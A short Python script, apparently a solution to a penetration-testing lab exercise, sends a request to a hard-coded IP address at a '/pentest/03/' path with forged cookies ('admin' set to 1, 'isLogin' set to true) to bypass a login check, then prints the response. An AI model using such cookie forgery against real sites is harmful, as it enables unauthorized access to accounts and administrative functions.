import requests
url = "http://115.28.78.16:13333/pentest/03/"
mycookie = {"admin":"1", "isLogin":"true"}
re = requests.get(url,cookies = mycookie)
print(re.text)
print(re.headers)
